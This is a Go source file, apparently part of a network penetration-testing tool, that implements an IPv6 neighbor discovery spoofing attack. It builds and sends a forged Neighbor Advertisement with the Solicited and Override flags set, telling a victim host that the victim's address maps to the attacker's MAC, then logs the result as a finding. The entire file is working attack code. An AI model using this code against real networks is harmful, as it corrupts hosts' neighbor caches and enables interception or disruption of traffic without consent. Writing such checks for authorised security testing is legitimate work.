// ndpspoof.go implements the IPv6 neighbor discovery spoofing attack.
//
// Durability (from the catalog): transient-decay. The attack sends a
// spoofed Neighbor Advertisement claiming the victim's IP is at the
// attacker's MAC. NUD / the real master resumes after the attack stops.
// No explicit teardown.

package ip6

import (
	"context"
	"encoding/json"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"

	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
	"go.aledante.io/FlowSeer/src/edge/netpen/check"
	"go.aledante.io/FlowSeer/src/edge/netpen/link"
)

type ndpSpoofFinding struct {
	Action   string `json:"action"`
	Target   string `json:"target"`
	SpoofMAC string `json:"spoof_mac"`
	Flags    uint8  `json:"flags"`
}

// RunNDPSpoof sends one Neighbor Advertisement to the target's IPv6 victim
// claiming the victim's own address is at the attack leg's MAC, from the
// leg's IPv6 address. The flags are probe content. The verdict is pending:
// whether the victim's neighbor cache took the entry needs a probe it does
// not have.
func RunNDPSpoof(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := deps.Target.Need(check.FieldVictim6, check.FieldVictim6MAC); err != nil {
		return check.Verdict{}, err
	}
	addr := deps.AttackLeg.Addr()
	victim := deps.Target.Victim6

	pkt, err := craftNDPSpoof(addr, victim)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "ndpspoof: craft NA")
	}
	if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
		return check.Verdict{}, errs.Wrap(err, "ndpspoof: send NA")
	}

	detail, _ := json.Marshal(ndpSpoofFinding{
		Action:   "neighbor-advertisement-spoof",
		Target:   victim.IP.String(),
		SpoofMAC: addr.MAC.String(),
		Flags:    0x60, // Solicited + Override
	})
	deps.Emitter.Finding("ipv6-nd", detail)

	return check.Pending("no observable: cache acceptance needs a probe of the victim"), nil
}

// craftNDPSpoof builds a spoofed Neighbor Advertisement: claims the victim
// is at the attacker's MAC.
func craftNDPSpoof(addr link.Addr, victim check.Host) ([]byte, error) {
	src := addr.MAC
	eth := &layers.Ethernet{
		DstMAC:       victim.MAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeIPv6,
	}
	ip := &layers.IPv6{
		Version:    6,
		NextHeader: layers.IPProtocolICMPv6,
		HopLimit:   255,
		SrcIP:      addr.IPv6,
		DstIP:      victim.IP,
	}
	icmp := &layers.ICMPv6{
		TypeCode: layers.CreateICMPv6TypeCode(layers.ICMPv6TypeNeighborAdvertisement, 0),
	}
	_ = icmp.SetNetworkLayerForChecksum(ip)

	na := &layers.ICMPv6NeighborAdvertisement{
		Flags:         0x60, // Solicited + Override
		TargetAddress: victim.IP,
		Options: layers.ICMPv6Options{
			{
				Type: layers.ICMPv6OptTargetAddress,
				Data: src, // attacker's MAC as target LLA
			},
		},
	}
	return craft.Default(eth, ip, icmp, na)
}

var (
	_ gopacket.SerializableLayer = (*layers.ICMPv6NeighborAdvertisement)(nil)
	_ gopacket.SerializableLayer = (*layers.ICMPv6)(nil)
)
